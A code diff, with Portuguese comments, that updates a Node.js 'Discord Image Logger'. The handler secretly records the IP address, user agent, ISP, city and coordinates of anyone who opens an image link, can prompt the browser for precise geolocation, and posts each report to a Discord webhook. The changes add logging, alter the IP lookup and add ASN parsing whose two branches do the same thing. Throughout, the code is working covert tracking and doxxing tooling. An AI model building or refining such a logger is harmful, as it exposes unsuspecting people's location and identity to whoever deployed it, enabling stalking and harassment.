@@ -1,5 +1,6 @@
-// Discord Image Logger - Versão completa com informações detalhadas de IP
+// Discord Image Logger - Versão com API IP melhorada
 const https = require('https');
+const http = require('http');
 const url = require('url');
 
 // Configuração
@@ -11,32 +12,43 @@ const config = {
   "accurateLocation": true
 };
 
-// Função para obter informações detalhadas sobre o IP
+// Função melhorada para obter informações detalhadas sobre o IP
 async function getIPInfo(ip) {
   return new Promise((resolve, reject) => {
-    const options = {
-      hostname: 'ip-api.com',
-      path: `/json/${ip}?fields=16976857`,
-      method: 'GET'
-    };
-
-    const req = https.request(options, (res) => {
+    // Usar uma API alternativa que funciona melhor com IPv6 e redes móveis
+    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
+    
+    http.get(apiUrl, (res) => {
       let data = '';
-      res.on('data', (chunk) => { data += chunk; });
+      res.on('data', (chunk) => { 
+        data += chunk; 
+      });
+      
       res.on('end', () => {
         try {
-          resolve(JSON.parse(data));
+          const parsedData = JSON.parse(data);
+          console.log('Resposta da API IP:', parsedData);
+          
+          // Verificar se a API retornou sucesso
+          if (parsedData.status === 'success') {
+            resolve(parsedData);
+          } else {
+            console.error('API retornou status diferente de sucesso:', parsedData);
+            // Ainda resolvemos com os dados que temos
+            resolve(parsedData);
+          }
         } catch (e) {
-          reject(e);
+          console.error('Erro ao analisar resposta da API IP:', e);
+          console.error('Dados recebidos:', data);
+          // Resolvemos com um objeto vazio para evitar erros na formatação
+          resolve({});
         }
       });
+    }).on('error', (error) => {
+      console.error('Erro ao fazer requisição para API de IP:', error);
+      // Resolvemos com um objeto vazio para evitar erros na formatação
+      resolve({});
     });
-
-    req.on('error', (error) => {
-      reject(error);
-    });
-
-    req.end();
   });
 }
 
@@ -44,11 +56,11 @@ async function getIPInfo(ip) {
 function sendDiscordWebhook(data) {
   return new Promise((resolve, reject) => {
     try {
-      // Parsear a URL do webhook
-      const webhookUrl = new URL(config.webhook);
-      
       // Preparar os dados
       const webhookData = JSON.stringify(data);
+      
+      // Parsear a URL do webhook para obter hostname e path
+      const webhookUrl = new URL(config.webhook);
       
       // Configurar a requisição
       const options = {
@@ -60,6 +72,8 @@ function sendDiscordWebhook(data) {
           'Content-Length': Buffer.byteLength(webhookData)
         }
       };
+      
+      console.log('Enviando para webhook:', options.hostname, options.path);
       
       // Criar a requisição
       const req = https.request(options, (res) => {
@@ -142,7 +156,6 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
   // Formatar coordenadas
   let coordsText = 'Unknown';
   let coordsSource = 'Approximate';
-  let googleMapsLink = '';
   
   if (coords) {
     coordsText = coords.replace(',', ', ');
@@ -158,6 +171,8 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
     const parts = info.timezone.split('/');
     if (parts.length >= 2) {
       timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
+    } else {
+      timezoneText = info.timezone;
     }
   }
 
@@ -171,6 +186,18 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
     }
   }
 
+  // Extrair ASN do campo "as" (pode conter o ASN completo como "AS12345 Organization")
+  let asn = 'Unknown';
+  if (info && info.as) {
+    // Extrair apenas o número do ASN
+    const asnMatch = info.as.match(/AS(\d+)/i);
+    if (asnMatch && asnMatch[1]) {
+      asn = info.as;
+    } else {
+      asn = info.as;
+    }
+  }
+
   return `**A User Opened the Original Image!**
 
 **Endpoint:** \`${endpoint || 'N/A'}\`
@@ -178,7 +205,7 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
 **IP Info:**
 > **IP:** \`${ip || 'Unknown'}\`
 > **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
-> **ASN:** \`${info && info.as ? info.as : 'Unknown'}\`
+> **ASN:** \`${asn}\`
 > **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
 > **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
 > **City:** \`${info && info.city ? info.city : 'Unknown'}\`
@@ -214,6 +241,9 @@ module.exports = async (req, res) => {
     
     const userAgent = req.headers['user-agent'] || 'Desconhecido';
     
+    console.log('Requisição recebida de IP:', ip);
+    console.log('User Agent:', userAgent);
+    
     // Verificar se é iOS para tratamento especial
     const deviceIsIOS = isIOS(userAgent);
     
@@ -227,8 +257,12 @@ module.exports = async (req, res) => {
         const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
         const [latitude, longitude] = coords.split(',');
         
+        console.log('Coordenadas recebidas:', latitude, longitude);
+        
         // Obter informações detalhadas do IP
+        console.log('Obtendo informações do IP...');
         const ipInfo = await getIPInfo(ip);
+        console.log('Informações do IP obtidas:', ipInfo);
         
         // Formatar a mensagem completa
         const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
@@ -247,6 +281,7 @@ module.exports = async (req, res) => {
           ]
         };
         
+        console.log('Enviando webhook para o Discord...');
         await sendDiscordWebhook(data);
         
         // Enviar página com a imagem
@@ -312,7 +347,9 @@ module.exports = async (req, res) => {
       // Se não temos geolocalização ainda, solicitar do navegador
       
       // Primeiro, obter informações do IP e enviar relatório básico
+      console.log('Obtendo informações básicas do IP...');
       const ipInfo = await getIPInfo(ip);
+      console.log('Informações básicas do IP obtidas:', ipInfo);
       
       // Formatar a mensagem básica
       const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
@@ -330,6 +367,7 @@ module.exports = async (req, res) => {
         ]
       };
       
+      console.log('Enviando relatório inicial para o Discord...');
       await sendDiscordWebhook(basicData);
       
       // Personalizar o HTML com base no dispositivo (iOS vs outros)
@@ -593,7 +631,10 @@ module.exports = async (req, res) => {
       res.status(200).send(html);
     } else {
       // Geolocalização não está ativada, enviar relatório básico
+      console.log('Obtendo informações básicas do IP (sem geolocalização)...');
       const ipInfo = await getIPInfo(ip);
+      console.log('Informações básicas do IP obtidas:', ipInfo);
+      
       const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
       
       const data = {
@@ -609,6 +650,7 @@ module.exports = async (req, res) => {
         ]
       };
       
+      console.log('Enviando relatório para o Discord...');
       await sendDiscordWebhook(data);
       
       // Enviar página com a imagem
